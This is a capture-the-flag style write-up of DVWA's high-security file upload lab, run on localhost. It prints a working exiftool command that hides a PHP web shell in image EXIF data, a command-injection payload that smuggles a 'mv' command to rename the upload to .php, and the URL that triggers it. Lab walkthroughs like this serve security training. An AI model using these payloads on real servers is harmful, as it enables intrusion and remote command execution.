📤 File Upload – High Security Level

### 🛠️ Objective:
Bypass multiple validation mechanisms to execute code.

---

### 🔒 What's Different?

Source code analysis reveals:
- ✅ Extension validation
- ✅ File size limit
- ✅ Image verification via `getimagesize()`

---

### 🚧 Problem with Traditional PHP Files

- Manually created PHP files or reverse shells won't pass image checks (`getimagesize()` returns false).
- Uploading such files results in an error.

---

### 🧠 Exploiting via Image Metadata (EXIF Injection)

1. Use a valid image (e.g., `image.jpeg`).
2. Inject malicious PHP code into the **EXIF metadata**:
```bash
exiftool -DocumentName="<h1>Backdoor<br><?php if(isset(\$_REQUEST['cmd'])){echo '<pre>'; system(\$_REQUEST['cmd']); echo '</pre>'; } __halt_compiler(); ?></h1>" image.jpeg
````

3. Upload the modified image.

✅ Upload will succeed since the image dimensions remain valid.

---

### 🐚 Triggering Execution

Uploaded image has `.jpeg` or `.png` extension, so it's treated as a safe image and won’t execute PHP.

💡 Rename the uploaded file to `.php` using a **previous vulnerability** (e.g., Command Injection):

```bash
127.0.0.1|mv ../../hackable/uploads/image.jpeg ../../hackable/uploads/backdoor.php
```

Then access:

```
http://127.0.0.1/DVWA/hackable/uploads/backdoor.php?cmd=id
```

✅ Code in EXIF metadata will be executed, providing a web shell.

---

### 🧩 Summary

* ✅ Image dimension and MIME checks
* ✅ Extension filter
* ✅ Still exploitable via EXIF + Command Injection

## ✅ Status

* ⚠️ Advanced exploit path
* 🔴 Requires chaining vulnerabilities
